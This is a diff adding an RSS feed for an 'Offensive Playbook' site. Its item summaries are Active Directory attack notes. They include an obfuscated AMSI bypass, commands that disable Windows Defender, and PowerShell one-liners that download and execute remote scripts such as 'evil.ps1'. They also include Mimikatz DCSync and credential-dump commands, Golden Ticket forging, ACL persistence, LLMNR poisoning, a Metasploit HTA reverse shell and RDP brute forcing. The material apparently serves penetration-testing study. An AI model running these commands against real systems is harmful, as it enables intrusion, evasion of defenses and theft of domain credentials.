@@ -1,0 +1,333 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Active_Directories on Offensive Playbook</title>
+    <link>https://ab0x90.github.io/active_directory/</link>
+    <description>Recent content in Active_Directories on Offensive Playbook</description>
+    <generator>Hugo -- gohugo.io</generator><atom:link href="https://ab0x90.github.io/active_directory/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Active_Directory/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Active_Directory/</guid>
+      <description> Basic info here </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Active_Directory_Enumeration/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Active_Directory_Enumeration/</guid>
+      <description>The commands listed below either use PowerView or the AD module, unless otherwise noted.
+General Domain Enumeration #Get current domain Get-NetDomain (PowerView) Get-ADDomain (ActiveDirectory Module) #Get object of another domain Get-NetDomain -Domain example.local (PowerView) Get-ADDomain -Identity example.local #Get domain SID for the current domain Get-DomainSID (PowerView) (Get-ADDomain).DomainSID #Get domain policy for the current domain Get-DomainPolicy (Get-DomainPolicy).&amp;#34;system access&amp;#34; #Get domain policy for another domain (Get-DomainPolicy -domain example.local).&amp;#34;system access&amp;#34; #Get domain controllers for the current domain Get-NetDomainController Get-ADDomainController #Get domain controllers for another domain Get-NetDomainController -Domain example.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/bypasses/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/bypasses/</guid>
+      <description>Different Bypass Methods AMSI S`eT-It`em ( &amp;#39;V&amp;#39;+&amp;#39;aR&amp;#39; + &amp;#39;IA&amp;#39; + (&amp;#39;blE:1&amp;#39;+&amp;#39;q2&amp;#39;) + (&amp;#39;uZ&amp;#39;+&amp;#39;x&amp;#39;) ) ([TYpE]( &amp;#34;{1}{0}&amp;#34;-F&amp;#39;F&amp;#39;,&amp;#39;rE&amp;#39; ) ) ; ( Get-varI`A`BLE ((&amp;#39;1Q&amp;#39;+&amp;#39;2U&amp;#39;) +&amp;#39;zX&amp;#39; ) -VaL ).&amp;#34;A`ss`Embly&amp;#34;.&amp;#34;GET`TY`Pe&amp;#34;((&amp;#34;{6}{3}{1}{4}{2}{0}{5}&amp;#34; -f(&amp;#39;Uti&amp;#39;+&amp;#39;l&amp;#39;),&amp;#39;A&amp;#39;,(&amp;#39;Am&amp;#39;+&amp;#39;si&amp;#39;),(&amp;#39;.Man&amp;#39;+&amp;#39;age&amp;#39;+&amp;#39;men&amp;#39;+&amp;#39;t.&amp;#39;),(&amp;#39;u&amp;#39;+&amp;#39;to&amp;#39;+&amp;#39;mation.&amp;#39;),&amp;#39;s&amp;#39;,(&amp;#39;Syst&amp;#39;+&amp;#39;em&amp;#39;) ) ).&amp;#34;g`etf`iElD&amp;#34;( ( &amp;#34;{0}{2}{1}&amp;#34; -f(&amp;#39;a&amp;#39;+&amp;#39;msi&amp;#39;),&amp;#39;d&amp;#39;,(&amp;#39;I&amp;#39;+&amp;#39;nitF&amp;#39;+&amp;#39;aile&amp;#39;) ),( &amp;#34;{2}{4}{0}{1}{3}&amp;#34; -f (&amp;#39;S&amp;#39;+&amp;#39;tat&amp;#39;),&amp;#39;i&amp;#39;,(&amp;#39;Non&amp;#39;+&amp;#39;Publ&amp;#39;+&amp;#39;i&amp;#39;),&amp;#39;c&amp;#39;,&amp;#39;c,&amp;#39; )).&amp;#34;sE`T`VaLUE&amp;#34;( ${n`ULl},${t`RuE} ) AV #disables real time monitoring Set-MpPreference -DisableRealtimeMonitoring $true #indicates whether defender scans all downlaoded files and attachments Set-MpPreference -DisableIOAVProtection $true Applocker If you recieve an error on language mode, applocker is configured on the server we are connecting to and we drop into a constrained language mode when powershell remoting this also means scripts cannot be run using dot sourcing Add &amp;lsquo;Invoke-Mimikatz&amp;rsquo; to the end of the script</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/CrackMapExec/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/CrackMapExec/</guid>
+      <description>Crackmapexec Work in progress.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Download_and_Execute/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Download_and_Execute/</guid>
+      <description> Methods to Download and Execute in PowerShell iex (New-Object Net.Webclient).DownloadString(&amp;#39;http://address.com/file.ps1&amp;#39;) $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate(&amp;#39;http://address.com/file.ps1&amp;#39;);sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response #PSv3 and on iex (iwr &amp;#39;http://address.com/file.ps1&amp;#39;) $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open(&amp;#39;GET&amp;#39;,&amp;#39;http://192.168.133.136/evil.ps1&amp;#39;,$false);$h.send();iex $h.responseText $wr = [System.NET.WebRequest]::Create(&amp;#34;http://192.168.133.136/test.txt&amp;#34;) $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd() </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Initial_Attack_Vectors/Initial_Attacks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Initial_Attack_Vectors/Initial_Attacks/</guid>
+      <description>This section will list initial attack vectors when first gaining access to a network</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Initial_Attack_Vectors/LLMNR/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Initial_Attack_Vectors/LLMNR/</guid>
+      <description>LLMNR is used to identify hosts when DNS fails to do so, previously NBT-NS
+The key flaw is that the services utilize a user&amp;rsquo;s NTLMv2 hash when appropriately responded to
+Run responder:
+kali@kali-[~]$sudo responder -I eth0 -rdw -v Wait for responder
+[*] [MDNS] Poisoned answer sent to 192.168.133.147 for name wrongname.local [*] [LLMNR] Poisoned answer sent to 192.168.133.147 for name wrongname [*] [LLMNR] Poisoned answer sent to 192.168.133.147 for name wrongname [*] [MDNS] Poisoned answer sent to 192.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Initial_Attack_Vectors/Relay_Attacks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Initial_Attack_Vectors/Relay_Attacks/</guid>
+      <description>ntlmrelayx info and setup For more detailed information see: https://www.secureauth.com/blog/playing-with-relayed-credentials/
+Instead of trying to crack the hashes, we can instead relay the hashes to specific machines/services that accept NTLM authentication and potentially gain access. This can be done over multiple services using ntlmrelayx.py.
+Each service can be specified as service://host, for example smb://10.0.0.1. Or all://host can be used to test all services.
+SMB/SMB2 LDAP MS-SQL IMAP/IMAPS HTTP/HTTPs SMTP This image, taken from the link above, shows how ntlmrelayx will operate setup as one-shot or SOCKS.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Lateral_Movement/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Lateral_Movement/</guid>
+      <description>Search for PSRemoting Capability PS C:\ad\Tools&amp;gt; . .\Find-PSRemotingLocalAdminAccess.ps1 PS C:\ad\Tools&amp;gt; Find-PSRemotingLocalAdminAccess Enter a PSRemote Session $sess = New-PSSession -ComputerName computer.local Execute Commands Remotely Use -Credential to pass a username/password
+#use to execute commands or scriptblocks Invoke-Command -CompuerName namehere -ScriptBlock {whoami;hostname} Invoke-Command -Scriptblock{Get-Process} -ComputerName(Get-Content&amp;lt;list_of_servers&amp;gt;) #Use below to execute scripts from files Invoke-Command -FilePath C:\scripts\Invoke-Mimikatz.ps1 -ComputerName(Get-Content&amp;lt;list_of_servers&amp;gt;) #Use below to execute locally loaded function on the remote machines: Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName(Get-Content&amp;lt;list_of_servers&amp;gt;) #In this case, we are passing Arguments.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Persistence/acls/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Persistence/acls/</guid>
+      <description>Persistence Using ACLs Add Permissions for DCSync With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run &amp;ldquo;DCSync&amp;rdquo;
+How to check for DCSync privileges:
+. .\PowerView.ps1 Get-ObjectAcl -DistinguishedName &amp;#34;dc=abc,dc=example,dc=local&amp;#34; -ResolveGUIDs | ? {($_.IdentityReference -match &amp;#34;USERNAME&amp;#34;) -and (($_.ObjectType -match &amp;#39;replication&amp;#39;) -or ($_.ActiveDirectoryRights -match &amp;#39;GenericAll&amp;#39;)) #Add FullControl rights: Add-ObjectAcl -TargetDistinguishedName &amp;#39;DC=abc,DC=example,DC=local&amp;#39; -PrincipalSamAccountName username -Rights All -Verbose #Using ActiveDirectoryModule and Set-ADACL: Set-ADACL -DistinguishedName &amp;#39;DC=abc,DC=example,DC=local&amp;#39; -Principal username -Verbose #Add rights for DCSync: Add-ObjectAcl -TargetDistinguishedName &amp;#39;DC=abc,DC=example,DC=local&amp;#39; -PrincipalSamAccountName username -Rights DCSync -Verbose #Using ActiveDirectoryModule and Set-ADACL: Set-ADACL -DistinguishedName &amp;#39;DC=abc,DC=example,DC=local&amp;#39; -Principal username -GUIDRight DCSync -Verbose #Execute DCSync: Invoke-Mimikatz -Command &amp;#39;&amp;#34;lsadump::dcsync /user:example\krbtgt&amp;#34;&amp;#39; Example:</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Persistence/Directory_Services_Restore_Mode/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Persistence/Directory_Services_Restore_Mode/</guid>
+      <description>There is a local Administrator on every DC called &amp;ldquo;Administrator&amp;rdquo; whose password is the DSRM password(SafeModePassword). This password is required when a server is promoted to Domain Controller and it is rarely changed After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC
+#Dump DSRM password (needs DA privs) Invoke-Mimikatz-Command &amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34;&amp;#39; -Computername dc #Compare the Administrator hash with the Administrator hash of below command Invoke-Mimikatz-Command &amp;#39;&amp;#34;lsadump::lsa/patch&amp;#34;&amp;#39; -Computernamedc #First one is the DSRM local Administrator.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Persistence/Domain_Persistence/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Persistence/Domain_Persistence/</guid>
+      <description>Domain Persistence Methods This section contains different methods of persistence for Active Directory</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Persistence/Golden_Ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Persistence/Golden_Ticket/</guid>
+      <description>A Golden Ticket attack involves an attacker gaining control of the KRBTGT hash and using that to forge valid TGTs in the domain. A TGT can be forged for any user if the KRBTGT hash is obtained.
+This attack involves using Invoke-Mimikatz to create the TGTs.
+#Execute mimikatz on DC as DA to get krbtgthash Invoke-Mimikatz -Command &amp;#39;&amp;#34;lsadump::lsa/patch&amp;#34;&amp;#39; –Computername example-dc #On any machine Invoke-Mimikatz-Command &amp;#39;&amp;#34;kerberos::golden /User:Administrator /domain:example.local /sid:S-1-5-21-1874506631-3219958514-538503648 /krbtgt:ff46a9d8bd66c6efd77603da26799hbn id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&amp;#34;&amp;#39; #To use the DCSyncfeature for getting krbtgthash execute the below command with DA privileges: Invoke-Mimikatz -Command &amp;#39;&amp;#34;lsadump::dcsync /user:example\krbtgt&amp;#34;&amp;#39; #Using the DCSyncoption needs no code execution (no need to run Invoke-Mimikatz) on the target DC.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Persistence/Silver_Ticket/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Persistence/Silver_Ticket/</guid>
+      <description>A silver Ticket attack is similar to a Golden Ticket in that it involves abusing credentials. A silver Ticket allows an attacker to forge a valid TGS for specific services.
+The password hash for the service account must be known, as the TGS is encrypted using the Service Accounts password hash.
+Invoke-Mimikatz is used here again.
+#Using hash of the Domain Controller computer account, below command provides access to shares on the DC.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Persistence/Skeleton_Key/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Persistence/Skeleton_Key/</guid>
+      <description>Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsassprocess) so that it allows access as any user with a single password. The attack was discovered by Dell Secureworksused in a malware named the Skeleton Key malware. All the publicly known methods are NOT persistent across reboots.
+#Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/PowerShell_Port_Scanner/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/PowerShell_Port_Scanner/</guid>
+      <description>The port scanner can be found at the following location
+https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4NetworkScanner/main/Scripts/IPv4NetworkScan.ps1
+.\IPv4NetworkScan.ps1 -StartIPv4Address 10.4.23.213 -EndIPv4Address 10.4.23.254 .\IPv4NetworkScan.ps1 -IPv4Address 10.4.23.0 -Mask 255.255.240.0 -DisableDNSResolving .\IPv4NetworkScan.ps1 -IPv4Address 10.4.23.0 -CIDR 25 -EnableMACResolving </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Priv_Esc/Active_Directory_Certificate_Services/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Priv_Esc/Active_Directory_Certificate_Services/</guid>
+      <description>ADCS Information These notes are mainly summarized from the Specterops paper linked below. https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
+https://tryhackme.com/room/adcertificatetemplates
+ADCS is Microsoft&amp;rsquo;s PKI implementation. ADCS is used for several things such as encrypting file systems, creating and verifying digital signatures, and even user authentication. What makes ADCS a good attack vector is that these certificates survive credential rotation. If a compromised account&amp;rsquo;s password is reset or the system reimaged, the attacker created certificate would still be valid providing persistence.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Priv_Esc/DNS_Admins/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Priv_Esc/DNS_Admins/</guid>
+      <description>It is possible for the members of the DNSAdmins group to load arbitrary DLLs with the privileges of dns.exe(SYSTEM). In case the DC also serves as DNS, this will provide us escalation to DA. Need privileges to restart the DNS service.
+Enumerate members of the DNS Admins group
+#PowerView Get-NetGroupMember -GroupName &amp;#34;DNSAdmins&amp;#34; #Using ActiveDirectory module Get-ADGroupMember -Identity DNSAdmins Configure DLL
+#From the privileges of DNSAdmins group member, configure DLL using dnscmd.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Priv_Esc/Invoke-Mimikatz/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Priv_Esc/Invoke-Mimikatz/</guid>
+      <description>Invoke-Mimikatz can be used to dump creds, tickets and more using mimikatz with PowerShell without dropping the mimikatz exe to disk Very useful for passing and replaying hashes, tickets and for many exciting AD attacks
+Using the code from ReflectivePEInjection, mimikatz is loaded reflictively into memory. All functions of mimikatz can be used from this script. The script needs admininistrative privs for dumping credentials from local machines. Many attacks needs specific privileges which are covered while discussing that attack</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Priv_Esc/Kerberoast/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Priv_Esc/Kerberoast/</guid>
+      <description>Kerberoasting happens by saving the TGS after step 4 in the Kerberos process. Since the TGS is encrypted with the service account&amp;rsquo;s NTLM hash it makes it possible to attempt to brute force the password.
+Steps for Kerberos:
+The user&amp;rsquo;s password is converted to an NTLM hash which is used to encrypt a timestamp. This is sent to the KDC as an AS-REQ.
+The TGT is encrypted signed and delivered back to the user as an AS-REP.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Priv_Esc/Kerberos_Delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Priv_Esc/Kerberos_Delegation/</guid>
+      <description>Kerberos Delegation allows the reuse of end-user credentials to access resources hosted on a different server. This is typically useful in tiered environments where a kerberos double hop is necessary.
+Example: a web server and a seperate database server, users authenticate to the web server and the web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server&amp;rsquo;s service account</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Priv_Esc/MSSQL_Servers/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Priv_Esc/MSSQL_Servers/</guid>
+      <description>MSSQL servers are generally deployed in a Windows Domain. SQL servers can be very good options for lateral movement as domain users can be mapped to database roles. For MSSQL and PowerShell magic we will use PowerUpSQL. https://github.com/NetSPI/PowerUpSQL
+Enumeration
+#Discovery (SPN Scanning) Get-SQLInstanceDomain #Check Accessibility Get-SQLConnectionTestThreaded Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose #Gather Information Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose Database Links: A database link allows a SQL server to access external data sources like other SQL servers and OLE DB data sources.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Priv_Esc/PowerUp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Priv_Esc/PowerUp/</guid>
+      <description>While PowerUp is used for local priv esc, it can be very userful when trying to obtain local admin privileges on a system
+A few useful PowerUp commands
+. .\PowerUp.ps1 #looks for unquotes services Get-ServiceUnquoted #looks for services with weak permissions Get-ModifiableService #runs all checks Invoke-AllChecks </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Priv_Esc/Privilege_Escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Priv_Esc/Privilege_Escalation/</guid>
+      <description>Domain Privilege Escalation Techniques Different domain priv esc techniques will be listed in this section</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Priv_Esc/Rights_Abuse/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Priv_Esc/Rights_Abuse/</guid>
+      <description>GenericALL over Host The specific situation this would apply is when a compromised user has GenericALL rights over a host, ideally a high-value target like a DC.
+First, Powermad needs to be loaded into memory on the target. Then a new machine account needs to be added.
+iex(new-object net.webclient).downloadstring(&amp;#39;http://10.10.14.36/Powermad.ps1&amp;#39;) New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString &amp;#39;123456&amp;#39; -AsPlainText -Force) -Verbose Using PowerView_dev, run the following to obtain the objectsid for the new machine account.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Priv_Esc/Trust_Abuse/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Priv_Esc/Trust_Abuse/</guid>
+      <description>Within the Same Forest Child to Parent Trust Abuse Domains in the same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. There are two ways of escalating privileges between two domains of the same forest.
+krbtgt hash trust tickets Krbtgt Hash Method Abuse SID history, obtain the SID for the Enterprise Admins Group of the root domain</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Reverse_Shells/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Reverse_Shells/</guid>
+      <description>Metasploit hta server Using Metasploit module exploit/windows/misc/hta_server
+Running this exploit results in two URLs
+Using any code execution method available, run the following
+mshta.exe URL_FROM_METASPLOIT
+If this executes, a meterpreter session will be started</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Service_Exploitation/RDP/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Service_Exploitation/RDP/</guid>
+      <description> Brute Force Nmap can be used to identify hosts running the RDP service
+nmap -p 3389 10.10.5.0/24 Hydra can be used to attempt to brute force the RDP service on identified hosts
+hydra -L users.txt -P pass.txt rdp://IPADDR </description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Service_Exploitation/Service_Exploitation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Service_Exploitation/Service_Exploitation/</guid>
+      <description>This section contains different Windows Service attack methods</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Service_Exploitation/SMB/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Service_Exploitation/SMB/</guid>
+      <description>Nmap discovery Nmap can be used to identify hosts running SMB service
+nmap -p 445 10.10.5.0/24 nmap -p 445 --script=smb-protocols 10.10.5.0/24 Mount a shared folder mount -t cifs //x.x.x.x/share /mnt/share mount -t cifs -o &amp;#34;username=user,password=password&amp;#34; //x.x.x.x/share /mnt/share Brute force login with Metasploit module: auxiliary/scanner/smb/smb_login
+The following methods attempt to initiate a null session, require no username or password enum4linux 10.10.5.15 crackmapexec smb &amp;lt;IP&amp;gt; -u &amp;#39;&amp;#39; -p &amp;#39;&amp;#39; --shares # list the shares smbclient -L \\\\10.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://ab0x90.github.io/Active_Directory/Service_Exploitation/WinRM/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://ab0x90.github.io/Active_Directory/Service_Exploitation/WinRM/</guid>
+      <description>Configuring WinRM Windows GUI Run &amp;gt; services.msc &amp;gt; Windows Remote Management (WS-Management) Start the Service Run &amp;gt; gpedit.msc &amp;gt; Administrative Templates &amp;gt; Windows Components &amp;gt; Windows Remote Management (WinRM) &amp;gt; WinRM Service Set &amp;#34;Allow remote server management through WinRM&amp;#34; to enabled Run &amp;gt; wf.msc &amp;gt; Inbound Rules &amp;gt; Windows Remote Management (HTTP-In) Set the rule to enabled for public Run &amp;gt; services.msc &amp;gt; Windows Remote Management (WS-Management) Start service again Run &amp;gt; gpedit.</description>
+    </item>
+    
+  </channel>
+</rss>
